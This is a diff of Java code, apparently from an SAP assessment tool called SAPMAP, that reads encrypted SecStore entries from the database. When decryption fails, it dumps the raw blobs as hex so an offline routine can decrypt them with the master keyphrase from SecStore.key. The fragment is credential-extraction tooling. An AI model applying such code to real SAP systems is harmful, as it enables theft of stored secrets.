@@ -182,8 +182,9 @@ try {
                     count++;
                     String cid  = rs.getString("CID");
                     String name = rs.getString("NAME");
-                    byte[] blob = rs.getBytes("VBYTES");
-                    if (blob == null || blob.length == 0) continue;
+                    byte[] origBlob = rs.getBytes("VBYTES");
+                    if (origBlob == null || origBlob.length == 0) continue;
+                    byte[] blob = origBlob;
                     // The MaxDB JDBC driver returns the full BLOB allocation
                     // (often 2000 bytes) with trailing NUL padding.  SecStoreFS
                     // chokes on the padded length with IllegalBlockSizeException
@@ -228,18 +229,17 @@ try {
                         // skipped without polluting the entries list.
                         Throwable rc = dt;
                         while (rc.getCause() != null) rc = rc.getCause();
-                        // Emit the raw VBYTES hex too so SAPMAP's offline
-                        // decrypt path (sap_java_secstore_offline) can
-                        // retry with the master keyphrase pulled directly
-                        // from SecStore.key.  ERPScan's 2018 research
-                        // confirmed the same keyphrase decrypts both the
-                        // filesystem SecStore AND J2EE_CONFIGENTRY VBYTES;
-                        // our JSP-side decryptM apparently refuses some
-                        // rows (e.g. format-byte 0x00 cleartext) that
-                        // offline Python handles fine.
-                        StringBuilder hx = new StringBuilder(blob.length * 2);
-                        for (int i = 0; i < blob.length; i++) {
-                            int b = blob[i] & 0xff;
+                        // Emit the ORIGINAL (un-trimmed) VBYTES hex so
+                        // SAPMAP's offline decrypt (sap_java_secstore_offline)
+                        // can retry with the master keyphrase pulled
+                        // directly from SecStore.key.  The trimming we
+                        // applied for engine-side decrypt may have stripped
+                        // real trailing padding bytes; offline code needs
+                        // the full raw buffer to get ciphertext lengths
+                        // that are multiples of 8.
+                        StringBuilder hx = new StringBuilder(origBlob.length * 2);
+                        for (int i = 0; i < origBlob.length; i++) {
+                            int b = origBlob[i] & 0xff;
                             if (b < 16) hx.append('0');
                             hx.append(Integer.toHexString(b));
                         }
